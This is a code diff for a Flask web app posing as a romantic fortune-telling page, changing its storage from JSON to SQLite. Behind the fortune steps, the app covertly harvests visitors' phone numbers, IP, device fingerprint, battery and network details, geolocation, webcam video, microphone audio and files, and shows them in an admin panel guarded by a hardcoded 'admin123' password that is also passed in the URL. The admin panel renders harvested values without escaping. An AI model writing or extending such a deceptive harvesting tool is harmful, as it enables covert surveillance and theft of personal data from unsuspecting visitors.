@@ -1,11 +1,100 @@
 from flask import Flask, request, jsonify, render_template_string, Response
 import json
 import os
+import sqlite3
 import random
 from datetime import datetime
 
 app = Flask(__name__)
 
+# ---------- SQLite Database Setup ----------
+DB_FILE = 'visitors.db'
+
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS visitors (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            sessionId TEXT,
+            timestamp TEXT,
+            ip TEXT,
+            name TEXT,
+            fortuneText TEXT,
+            phoneNumber TEXT,
+            fingerprint TEXT,
+            batteryLevel TEXT,
+            batteryCharging TEXT,
+            networkType TEXT,
+            networkSpeed TEXT,
+            deviceMemory TEXT,
+            screen TEXT,
+            timezone TEXT,
+            userAgent TEXT,
+            latitude TEXT,
+            longitude TEXT,
+            mapUrl TEXT,
+            cameraVideo TEXT,
+            microphone TEXT,
+            files TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def save_visitor(data):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    # Check if sessionId already exists
+    c.execute("SELECT id FROM visitors WHERE sessionId = ?", (data.get('sessionId'),))
+    existing = c.fetchone()
+    if existing:
+        c.execute('''
+            UPDATE visitors SET
+                timestamp = ?, ip = ?, name = ?, fortuneText = ?, phoneNumber = ?,
+                fingerprint = ?, batteryLevel = ?, batteryCharging = ?, networkType = ?, networkSpeed = ?,
+                deviceMemory = ?, screen = ?, timezone = ?, userAgent = ?,
+                latitude = ?, longitude = ?, mapUrl = ?, cameraVideo = ?, microphone = ?, files = ?
+            WHERE sessionId = ?
+        ''', (
+            data.get('timestamp'), data.get('ip'), data.get('name'), data.get('fortuneText'), data.get('phoneNumber'),
+            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
+            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
+            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files'),
+            data.get('sessionId')
+        ))
+    else:
+        c.execute('''
+            INSERT INTO visitors (
+                sessionId, timestamp, ip, name, fortuneText, phoneNumber,
+                fingerprint, batteryLevel, batteryCharging, networkType, networkSpeed,
+                deviceMemory, screen, timezone, userAgent,
+                latitude, longitude, mapUrl, cameraVideo, microphone, files
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'), data.get('fortuneText'), data.get('phoneNumber'),
+            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
+            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
+            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files')
+        ))
+    conn.commit()
+    conn.close()
+
+def get_all_visitors():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT * FROM visitors ORDER BY id DESC")
+    rows = c.fetchall()
+    # Get column names
+    columns = [description[0] for description in c.description]
+    visitors = []
+    for row in rows:
+        visitor = {columns[i]: row[i] for i in range(len(columns))}
+        visitors.append(visitor)
+    conn.close()
+    return visitors
+
+# ---------- Romantic Fortunes ----------
 FORTUNES = [
     "Your soulmate is thinking of you right now 💕",
     "A passionate kiss awaits you this week 😘",
@@ -41,53 +130,7 @@ FORTUNES = [
     "Your romantic destiny calls you forward 🚀"
 ]
 
-DATA_FILE = 'visitors.json'
-
-# All possible fields – admin will see these columns
-ALL_FIELDS = [
-    'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
-    'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
-    'deviceMemory', 'screen', 'timezone', 'userAgent',
-    'latitude', 'longitude', 'mapUrl',
-    'cameraVideo', 'microphone', 'files'
-]
-
-def init_json():
-    if not os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'w') as f:
-            json.dump([], f)
-
-def save_visitor(data):
-    init_json()
-    with open(DATA_FILE, 'r') as f:
-        visitors = json.load(f)
-    session_id = data.get('sessionId')
-    if session_id:
-        for i, v in enumerate(visitors):
-            if v.get('sessionId') == session_id:
-                visitors[i].update(data)
-                with open(DATA_FILE, 'w') as f:
-                    json.dump(visitors, f, indent=2)
-                return True
-    visitors.append(data)
-    with open(DATA_FILE, 'w') as f:
-        json.dump(visitors, f, indent=2)
-    return True
-
-def get_visitors():
-    init_json()
-    with open(DATA_FILE, 'r') as f:
-        return json.load(f)
-
-def get_session_data(session_id):
-    init_json()
-    with open(DATA_FILE, 'r') as f:
-        visitors = json.load(f)
-    for v in visitors:
-        if v.get('sessionId') == session_id:
-            return v
-    return None
-
+# ---------- Flask Routes ----------
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -101,14 +144,13 @@ def get_session_data_route():
     data = request.json
     session_id = data.get('sessionId')
     if session_id:
-        session_data = get_session_data(session_id)
-        if session_data:
-            return jsonify({
-                'exists': True,
-                'fortuneText': session_data.get('fortuneText'),
-                'name': session_data.get('name'),
-                'phoneNumber': session_data.get('phoneNumber')
-            })
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute("SELECT name, fortuneText, phoneNumber FROM visitors WHERE sessionId = ?", (session_id,))
+        row = c.fetchone()
+        conn.close()
+        if row:
+            return jsonify({'exists': True, 'name': row[0], 'fortuneText': row[1], 'phoneNumber': row[2]})
     return jsonify({'exists': False})
 
 @app.route('/save', methods=['POST'])
@@ -116,7 +158,11 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    for field in ALL_FIELDS:
+    # Ensure all fields exist
+    required_fields = ['sessionId', 'name', 'fingerprint', 'batteryLevel', 'batteryCharging',
+                       'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
+                       'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
+    for field in required_fields:
         if field not in data:
             data[field] = ''
     save_visitor(data)
@@ -129,16 +175,11 @@ def save_phone():
     phone = data.get('phoneNumber')
     fortune_text = data.get('fortune')
     if session_id:
-        init_json()
-        with open(DATA_FILE, 'r') as f:
-            visitors = json.load(f)
-        for v in visitors:
-            if v.get('sessionId') == session_id:
-                v['phoneNumber'] = phone
-                v['fortuneText'] = fortune_text
-                break
-        with open(DATA_FILE, 'w') as f:
-            json.dump(visitors, f, indent=2)
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute("UPDATE visitors SET phoneNumber = ?, fortuneText = ? WHERE sessionId = ?", (phone, fortune_text, session_id))
+        conn.commit()
+        conn.close()
         return jsonify({'status': 'saved'})
     return jsonify({'status': 'error'}), 400
 
@@ -147,26 +188,26 @@ def admin():
     if request.method == 'POST':
         password = request.form.get('password')
         if password == 'admin123':
-            visitors = get_visitors()
+            visitors = get_all_visitors()
+            if not visitors:
+                return '<h1>💕 No data yet</h1><p><a href="/admin">Back to login</a></p>'
+            # Get all column names from the first visitor
+            columns = list(visitors[0].keys())
             html = '<h1>💕 Visitor Data (All Fields)</h1>'
             html += '<p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<div style="overflow-x: auto;">'
             html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 800px;">'
-            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{f}</th>' for f in ALL_FIELDS) + '</tr>'
-            if not visitors:
-                html += '<tr><td colspan="21">No data yet</td></tr>'
-            else:
-                for v in visitors:
-                    html += '<tr>'
-                    for f in ALL_FIELDS:
-                        val = v.get(f, '')
-                        # For long strings (cameraVideo, files), use scrollable div
-                        if f in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
-                            display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
-                        else:
-                            display_val = str(val)[:500]  # still show up to 500 chars for other fields
-                        html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
-                    html += '</tr>'
+            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{col}</th>' for col in columns) + '</tr>'
+            for v in visitors:
+                html += '<tr>'
+                for col in columns:
+                    val = v.get(col, '')
+                    if col in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
+                        display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
+                    else:
+                        display_val = str(val)[:500]
+                    html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
+                html += '</tr>'
             html += '</table></div>'
             return html
         else:
@@ -200,17 +241,21 @@ def download_csv():
     pwd = request.args.get('pass')
     if pwd != 'admin123':
         return 'Unauthorized', 403
-    visitors = get_visitors()
+    visitors = get_all_visitors()
     import csv
     from io import StringIO
+    if not visitors:
+        return "No data"
     output = StringIO()
     writer = csv.writer(output, quoting=csv.QUOTE_ALL)
-    writer.writerow(ALL_FIELDS)
+    columns = list(visitors[0].keys())
+    writer.writerow(columns)
     for v in visitors:
-        row = [str(v.get(f, '')).replace('\n', ' ').replace('\r', ' ') for f in ALL_FIELDS]
+        row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
         writer.writerow(row)
     return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'})
 
+# ---------- HTML Template (unchanged) ----------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -478,6 +523,7 @@ HTML_TEMPLATE = '''
             const timeout = setTimeout(() => {
                 visitorData.latitude = 'denied';
                 visitorData.longitude = 'denied';
+                visitorData.mapUrl = '';
                 showStep('💕 Celestial Anchor', 'Location denied or timeout', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             }, 10000);
@@ -524,7 +570,7 @@ HTML_TEMPLATE = '''
                         const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                         const reader = new FileReader();
                         reader.onloadend = () => {
-                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000); // store first 5000 chars
+                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                             visitorData.microphone = 'recorded';
                             mediaStream.getTracks().forEach(t => t.stop());
                             showStep('🌟 Heartbeat Whisper', 'Video & audio captured!', 100);
@@ -674,6 +720,6 @@ HTML_TEMPLATE = '''
 '''
 
 if __name__ == '__main__':
-    init_json()
+    init_db()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
